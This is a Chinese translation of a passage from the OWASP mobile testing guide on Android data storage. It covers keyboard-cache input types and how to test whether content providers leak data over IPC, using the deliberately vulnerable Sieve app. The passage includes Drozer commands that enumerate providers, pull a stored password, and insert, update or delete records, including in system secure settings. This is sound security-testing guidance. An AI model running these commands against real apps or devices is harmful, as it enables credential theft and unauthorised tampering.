# Android数据存储[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#android-data-storage) · part 4 · part 1

> 分段 1/2。索引见 `Android数据存储-p4.md`。

# Android数据存储[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#android-data-storage) · part 4

> 分段 4/6。索引见 `Android数据存储.md`。

## 承接

| :----------------------------------------------------------- | :----------------------------------------------------------- | :------ |
| [`textPassword`](https://developer.android.com/reference/android/widget/TextView#attr_android:inputType:~:text=_SUGGESTIONS.-,textPassword,-81) | [`TYPE_TEXT_VARIATION_PASSWORD`](https://developer.android.com/reference/android/text/InputType#TYPE_TEXT_VARIATION_PASSWORD) | 3个     |
| [`textVisiblePassword`](https://developer.android.com/reference/android/widget/TextView#attr_android:inputType:~:text=_URI.-,textVisiblePassword,-91) | [`TYPE_TEXT_VARIATION_VISIBLE_PASSWORD`](https://developer.android.com/reference/android/text/InputType#TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) | 3个     |
| [`numberPassword`](https://developer.android.com/reference/android/widget/TextView#attr_android:inputType:~:text=_DECIMAL.-,numberPassword,-12) | [`TYPE_NUMBER_VARIATION_PASSWORD`](https://developer.android.com/reference/android/text/InputType#TYPE_NUMBER_VARIATION_PASSWORD) | 11      |
| [`textWebPassword`](https://developer.android.com/reference/android/widget/TextView#attr_android:inputType:~:text=_ADDRESS.-,textWebPassword,-e1) | [`TYPE_TEXT_VARIATION_WEB_PASSWORD`](https://developer.android.com/reference/android/text/InputType#TYPE_TEXT_VARIATION_WEB_PASSWORD) | 11      |

检查应用程序代码以验证没有任何输入类型被覆盖。例如，通过`findViewById(R.id.KeyBoardCache).setInputType(InputType.TYPE_CLASS_TEXT)`将输入字段的输入类型`KeyBoardCache`设置为`text`重新启用键盘缓存。

最后，检查 Android Manifest ( `android:minSdkVersion`) 中所需的最低 SDK 版本，因为它必须支持使用的常量（例如，Android SDK 版本 11 是必需的`textWebPassword`）。否则，编译后的应用程序将不会接受允许键盘缓存的已使用输入类型常量。

### 动态分析[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#dynamic-analysis_3)

启动应用程序并单击包含敏感数据的输入字段。如果建议使用字符串，则这些字段的键盘缓存尚未禁用。

## 确定敏感存储数据是否已通过 IPC 机制公开 (MSTG-STORAGE-6)[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#determining-whether-sensitive-stored-data-has-been-exposed-via-ipc-mechanisms-mstg-storage-6)

### 概述[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#overview_5)

作为 Android 的 IPC 机制的一部分，内容提供程序允许其他应用访问和修改应用存储的数据。如果配置不当，这些机制可能会泄露敏感数据。

### 静态分析[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#static-analysis_5)

第一步是查看`AndroidManifest.xml`以检测应用公开的Content Provider(内容提供者)。`<provider>`您可以通过元素识别Content Provider(内容提供者)。完成以下步骤：

- 判断导出标签( `android:exported`) 的值是否为`"true"`。即使不是，`"true"`如果`<intent-filter>`已经为标签定义了标签，标签也会自动设置为。如果内容仅供应用程序本身访问，请设置`android:exported`为`"false"`. 如果不是，请将标志设置为`"true"`并定义适当的读/写权限。
- 确定数据是否受到权限标记 ( `android:permission`) 的保护。权限标签限制对其他应用程序的曝光。
- 确定`android:protectionLevel`属性是否具有值`signature`。此设置表示数据仅供来自同一企业的应用程序访问（即，使用相同的密钥签名）。要使其他应用程序可以访问数据，请对`<permission>`元素应用安全策略并设置适当的`android:protectionLevel`. 如果您使用`android:permission`，其他应用程序必须`<uses-permission>`在其清单中声明相应的元素才能与您的Content Provider(内容提供者)交互。您可以使用该`android:grantUriPermissions`属性向其他应用程序授予更具体的访问权限；您可以限制对`<grant-uri-permission>`元素的访问。

检查源代码以了解内容提供程序的使用方式。搜索以下关键字：

- `android.content.ContentProvider`
- `android.database.Cursor`
- `android.database.sqlite`
- `.query`
- `.update`
- `.delete`

> 为避免应用程序内的 SQL 注入攻击，请使用参数化查询方法，例如`query`、`update`和`delete`。确保正确清理所有方法参数；例如，如果`selection`参数由串联的用户输入组成，则可能会导致 SQL 注入。

如果公开内容提供程序，请确定是否使用参数化[查询方法](https://developer.android.com/reference/android/content/ContentProvider.html#query(android.net.Uri%2C java.lang.String[]%2C java.lang.String%2C java.lang.String[]%2C java.lang.String))（`query`、`update`和`delete`）来防止 SQL 注入。如果是这样，请确保他们的所有论点都经过适当的过滤。

我们将使用易受攻击的密码管理器应用程序[Sieve](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk)作为易受攻击的内容提供程序的示例。

#### 检查 Android 清单[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#inspect-the-android-manifest)

识别所有定义的`<provider>`元素：

```
<provider
      android:authorities="com.mwr.example.sieve.DBContentProvider"
      android:exported="true"
      android:multiprocess="true"
      android:name=".DBContentProvider">
    <path-permission
          android:path="/Keys"
          android:readPermission="com.mwr.example.sieve.READ_KEYS"
          android:writePermission="com.mwr.example.sieve.WRITE_KEYS"
     />
</provider>
<provider
      android:authorities="com.mwr.example.sieve.FileBackupProvider"
      android:exported="true"
      android:multiprocess="true"
      android:name=".FileBackupProvider"
/>
```

如上所示`AndroidManifest.xml`，应用程序导出了两个内容提供程序。请注意，一个路径（“/Keys”）受读写权限保护。

#### 检查源代码[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#inspect-the-source-code)

检查文件中的`query`函数`DBContentProvider.java`以确定是否泄露了任何敏感信息：

Java 中的示例：

```
public Cursor query(final Uri uri, final String[] array, final String s, final String[] array2, final String s2) {
    final int match = this.sUriMatcher.match(uri);
    final SQLiteQueryBuilder sqLiteQueryBuilder = new SQLiteQueryBuilder();
    if (match >= 100 && match < 200) {
        sqLiteQueryBuilder.setTables("Passwords");
    }
    else if (match >= 200) {
        sqLiteQueryBuilder.setTables("Key");
    }
    return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, (String)null, (String)null, s2);
}
```

Kotlin 中的示例：

```
fun query(uri: Uri?, array: Array<String?>?, s: String?, array2: Array<String?>?, s2: String?): Cursor {
        val match: Int = this.sUriMatcher.match(uri)
        val sqLiteQueryBuilder = SQLiteQueryBuilder()
        if (match >= 100 && match < 200) {
            sqLiteQueryBuilder.tables = "Passwords"
        } else if (match >= 200) {
            sqLiteQueryBuilder.tables = "Key"
        }
        return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, null as String?, null as String?, s2)
    }
```

这里我们看到实际上有两条路径，“/Keys”和“/Passwords”，后者在清单中没有受到保护，因此很容易受到攻击。

访问 URI 时，查询语句返回所有密码和路径`Passwords/`。我们将在“动态分析”部分解决这个问题并显示所需的确切 URI。

### 动态分析[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#dynamic-analysis_4)

#### 测试Content Provider(内容提供者)[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#testing-content-providers)

要动态分析应用程序的Content Provider(内容提供者)，首先枚举攻击面：将应用程序的包名称传递给 Drozer 模块`app.provider.info`：

```
dz> run app.provider.info -a com.mwr.example.sieve
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
```

在此示例中，导出了两个内容提供程序。两者都可以未经许可访问，`/Keys`除了`DBContentProvider`. 使用此信息，您可以重建部分内容 URI 以访问`DBContentProvider`（URI 以 开头`content://`）。

要在应用程序中识别Content Provider(内容提供者) URI，请使用 Drozer 的`scanner.provider.finduris`模块。该模块以多种方式猜测路径并确定可访问的内容 URI：

```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

获得可访问Content Provider(内容提供者)列表后，尝试使用以下`app.provider.query`模块从每个提供者中提取数据：

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 - encoded)
email: incognitoguy50@gmail.com
```

您还可以使用 Drozer 插入、更新和删除易受攻击的Content Provider(内容提供者)的记录：

- 插入记录

```
dz> run app.provider.insert content://com.vulnerable.im/messages
                --string date 1331763850325
                --string type 0
                --integer _id 7
```

- 更新记录

```
dz> run app.provider.update content://settings/secure
                --selection "name=?"
                --selection-args assisted_gps_enabled
                --integer value 0
```

- 删除记录

```
dz> run app.provider.delete content://settings/secure
                --selection "name=?"
                --selection-args my_setting
```

